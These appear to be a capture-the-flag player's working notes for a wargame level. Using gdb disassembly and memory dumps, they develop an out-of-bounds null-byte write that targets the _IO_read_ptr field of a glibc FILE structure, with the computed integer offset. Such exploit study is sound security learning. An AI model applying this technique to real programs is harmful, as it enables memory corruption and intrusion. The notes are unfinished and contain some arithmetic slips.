# vim: ts=2 sw=2 et ai


We want to figure out what the address stored in FILE* is going to
be.  There's two clues

   0x080484e4 <+32>:	call   0x80483c8 <fopen@plt>
   0x080484e9 <+37>:	mov    DWORD PTR [ebp-0xc],eax
   ^^ Stored into $ebp-0xc
   ...
   0x08048500 <+60>:	cmp    DWORD PTR [ebp-0xc],0x0
   ^^ if (!fp ... ) {...}
   0x08048504 <+64>:	je     0x804850e <main+74>
   ^^ if (... arc != 2) {}
   0x08048506 <+66>:	cmp    DWORD PTR [ebp+0x8],0x2

So we should be able to break at the first comparison to peek inside
the $ebp-0xc

  > break *main+60
  > run "aaaa"
  > p $ebp-0xc
  $2 = (void *) 0xbffffc4c
  > x $ebp-0xc
  0xbffffc4c:	0x0804a008

Looking deeper into it we can see it looks like this:

  > x/32 0x0804a008
  0x804a008:	0xfbad2488	0x00000000	0x00000000	0x00000000
  0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
  0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
  0x804a038:	0x00000000	0xb7fc2cc0	0x00000003	0x00000000
  0x804a048:	0x00000000	0x00000000	0x0804a0a0	0xffffffff
  0x804a058:	0xffffffff	0x00000000	0x0804a0ac	0x00000000
  0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
  0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000

It is immediately obvious that 0xfbad2488 is some sort of signal
variable.  In `libio.h` we can see that...

  #define _IO_MAGIC 0xFBAD0000 /* Magic number */
  #define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
  ...
  struct _IO_FILE {
    int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  #define _IO_file_flags _flags
    ...
    char* _IO_read_ptr;        /* Current read pointer */
  };

So we can see that we are in the appropriate section of the memory,
given that the MAGIC is at the head of our memory block.

Let's now look at this memory in two additional states:
1.  Before first `fread`.
2.  After the first `fread`.
3.  After the second `fread`.

1 --- break *main+115
  0x804a008:	0xfbad2488	0x00000000	0x00000000	0x00000000
  0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
  0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
  0x804a038:	0x00000000	0xb7fc2cc0	0x00000003	0x00000000
  0x804a048:	0x00000000	0x00000000	0x0804a0a0	0xffffffff
  0x804a058:	0xffffffff	0x00000000	0x0804a0ac	0x00000000
  0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
  0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000

2 --- break *main+120
  0x804a008:	0xfbad2488	0x0804a17c	0x0804a190	0x0804a168
  0x804a018:	0x0804a168	0x0804a168	0x0804a168	0x0804a168
  0x804a028:	0x0804b168	0x00000000	0x00000000	0x00000000
  0x804a038:	0x00000000	0xb7fc2cc0	0x00000003	0x00000000
  0x804a048:	0x00000000	0x00000000	0x0804a0a0	0xffffffff
  0x804a058:	0xffffffff	0x00000000	0x0804a0ac	0x00000000
  0x804a068:	0x00000000	0x00000000	0xffffffff	0x00000000
  0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000


3 --- break *main+182
  0x804a008:	0xfbad2488	0x0804a18f	0x0804a190	0x0804a168
  0x804a018:	0x0804a168	0x0804a168	0x0804a168	0x0804a168
  0x804a028:	0x0804b168	0x00000000	0x00000000	0x00000000
  0x804a038:	0x00000000	0xb7fc2cc0	0x00000003	0x00000000
  0x804a048:	0x00000000	0x00000000	0x0804a0a0	0xffffffff
  0x804a058:	0xffffffff	0x00000000	0x0804a0ac	0x00000000
  0x804a068:	0x00000000	0x00000000	0xffffffff	0x00000000
  0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000

We can see at address 0x804a00c that between '2' and '3', it goes from
0x0804a18f -> 0x0804a17c, that's 19 bytes.  Which is what we expect for
it to read the `pwfile.msg_err`.

Presumably because because this variable went from:
  0x00000000 -> 0x0804a18f -> 0x0804a17c

There must be some logic which checks:

  FILE* fp;
  if (fp->_IO_read_ptr == 0) {
    fp->_IO_write_ptr = /* some allocation logic */
  }

So, our goal will be to overwrite this value by using:

  pwfile.pass[19] = 0;
  ptr[atoi(argv[1])] = 0; // <<<<<<<


Let's now figure out where that code is in memory.

This shows what the address of `.pass` should be at $ebp-0x48.
  0x08048531 <+109>:	lea    eax,[ebp-0x48]
  0x08048534 <+112>:	mov    DWORD PTR [esp],eax
  0x08048537 <+115>:	call   0x80483f8 <fread@plt>

This shows that `.pass + 19` is at $ebp-0x35, the math adds up.
  0x0804853c <+120>:	mov    BYTE PTR [ebp-0x35],0x0

I *think* this is the computed assignment:
  0x0804854b <+135>:	call   0x80483d8 <atoi@plt>
  0x08048550 <+140>:	mov    BYTE PTR [eax+ebp*1-0x58],0x0

So let's break at *main+140 and see if changing the arguments changes
the value $eax.  These are the execution values...
  "0001" -> 0x00000001
  "0002" -> 0x00000002
  "-001" -> 0xfffffffe

At that time:
  $ebp*1 - 0x58 = 0xbffffc00

# -
We now need to recompute the address target address, 0x0804a008.

So we need to get from 0xbffffc00 to 0x0804a00c.  There are only two
directions, negative or positive with roll over.

If we try to go negative, the difference requirement is -3086703604,
that's less than the minimum int32.  So, our only option is to add
and roll over.

We now need to recompute address using the longest integer string,
which is 10 digits long.

With some calculations and experimentation, we conclude that it's the
value of 1208263692.

This is insufficient because we changed the argv[1] length, which
shifts the stack.  So let's re-run it with a standard environment.

  unset env LINES
  unset env COLUMNS
  set env _=None

Address of the FILE* is now -> 0xbffffc7c

Environment is now:
  XDG_SESSION_ID=370846
  TERM=xterm-256color
  SHELL=/bin/bash
  SSH_TTY=/dev/pts/45
  USER=level10
  LD_LIBRARY_PATH=/usr/local/radare/lib/
  MAIL=/var/mail/level10
  PATH=/usr/local/radare/bin:/usr/local/gdb10/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
  PWD=/home/level10
  LANG=en_GB.UTF-8
  SHLVL=1
  HOME=/home/level10
  LANGUAGE=en_GB:en
  LS_OPTIONS=--color=auto
  LOGNAME=level10
  XDG_RUNTIME_DIR=/run/user/1010
  _=None


  gdb-peda$ p $ebp-0xc
  $2 = (void *) 0xbffffc7c
  gdb-peda$ x $ebp-0xc
  0xbffffc3c:	0x0804a008

So we need to get from the 0xbffffc7c -> 0x0804a00c, this results in a
value of 1208263640 + 4.



















  struct _IO_FILE {
    int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  #define _IO_file_flags _flags

    /* The following pointers correspond to the C++ streambuf protocol. */
    /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
    char* _IO_read_ptr;        /* Current read pointer */
    char* _IO_read_end;        /* End of get area. */
    char* _IO_read_base;        /* Start of putback+get area. */
    char* _IO_write_base;        /* Start of put area. */
    char* _IO_write_ptr;        /* Current put pointer. */
    char* _IO_write_end;        /* End of put area. */
    char* _IO_buf_base;        /* Start of reserve area. */
    char* _IO_buf_end;        /* End of reserve area. */
    /* The following fields are used to support backing up and undo. */
    char *_IO_save_base; /* Pointer to start of non-current get area. */
    char *_IO_backup_base;  /* Pointer to first valid character of backup area */
    char *_IO_save_end; /* Pointer to end of non-current get area. */

    struct _IO_marker *_markers;

    struct _IO_FILE *_chain;

    int _fileno;
  #if 0
    int _blksize;
  #else
    int _flags2;
  #endif
    _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

  #define __HAVE_COLUMN /* temporary */
    /* 1+column number of pbase(); 0 is unknown. */
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];

    /*  char* _save_gptr;  char* _save_egptr; */

    _IO_lock_t *_lock;
  #ifdef _IO_USE_OLD_IO_FILE
  };


